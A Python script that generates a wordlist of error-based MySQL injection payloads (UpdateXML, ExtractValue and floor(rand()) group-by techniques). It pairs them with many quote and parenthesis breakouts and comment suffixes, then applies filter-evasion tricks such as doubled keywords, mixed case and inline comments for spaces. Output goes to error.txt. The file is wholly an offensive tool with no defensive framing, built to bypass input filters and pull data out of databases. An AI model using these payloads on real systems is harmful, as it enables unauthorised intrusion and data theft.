
payload1 = "or UpdatExml(1,concat('~~~!@~~~',[REPLACE]),1)"
payload2 = "or Extractvalue(1,concat('~~~!@~~~',[REPLACE]))"
payload3 = "uNiOn sElEct count(*),concat_ws('~~~!@~~~',floor(rand(0)*2),[REPLACE])x[COUNT] from information_schema.tables group by x"
payload4 = "or(UpdatExml(1,concat('~~~!@~~~',[REPLACE]),1))"
#.replace("or","oorr")
#.replace(" ","/**/")

pre_ = ["' ",'" ',"') "," ","')) ",")' ","))' ",'") ','")) ',')" ','))" ']
stuff_ = ["#","-- ","and('1')='1","and('1')=\"1","and('1')=('1","and('1')=(\"1","and('1')=(('1","and('1')=((\"1","and('1')='(1","and('1')='((1","and('1')=\"((1","and('1')=\"(1"]
with open("error.txt","a+") as f:
    for pre in pre_:
        for stuff in stuff_:
            '''f.write(pre+payload1.replace("or","oorr") + stuff + "\n")
            f.write(pre+payload1.replace("or","ooRr") + stuff + "\n")
            f.write(pre+payload1.replace(" ","/**/") + stuff + "\n")
            f.write(pre+payload1.replace(" ","%0a") + stuff + "\n")
            f.write(pre+payload2.replace("or","oorr") + stuff + "\n")
            f.write(pre+payload2.replace("or","ooRr") + stuff + "\n")
            f.write(pre+payload4.replace(" ","/**/") + stuff + "\n")
            f.write(pre+payload4.replace(" ","%0a") + stuff + "\n")
            f.write(pre+payload4.replace("or","oorr") + stuff + "\n")
            f.write(pre+payload4.replace("or","ooRr") + stuff + "\n")
            f.write(pre+payload4.replace(" ","/**/") + stuff + "\n")
            f.write(pre+payload4.replace(" ","%0a") + stuff + "\n")
            f.write(pre+payload1.replace("or","oorr") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload1.replace("or","ooRr") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload1.replace(" ","/**/") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload1.replace(" ","%0a") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload2.replace("or","oorr") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload2.replace("or","ooRr") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload4.replace(" ","/**/") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload4.replace(" ","%0a") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload4.replace("or","oorr") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload4.replace("or","ooRr") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload4.replace(" ","/**/") + stuff.replace("and","aANDnd") + "\n")
            f.write(pre+payload4.replace(" ","%0a") + stuff.replace("and","aANDnd") + "\n")'''
            for i in range(10):
                f.write(pre+payload3.replace(" ","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace(" ","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("%0A","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("%0A","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace(" ","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace(" ","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("%0A","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("%0A","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace(" ","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace(" ","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("%0A","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("%0A","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff + "\n")
                f.write(pre+payload3.replace(" ","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace(" ","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("%0A","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("%0A","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace(" ","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace(" ","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("%0A","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("sElEct","sElsEleCtEct").replace("%0A","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace(" ","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace(" ","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("%0A","/**/").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")
                f.write(pre+payload3.replace("uNiOn","uNUniOniOn").replace("%0A","/**/").replace("or","oorr").replace("[COUNT]","{}".format(",1"*i)) + stuff.replace("and","aandnd") + "\n")


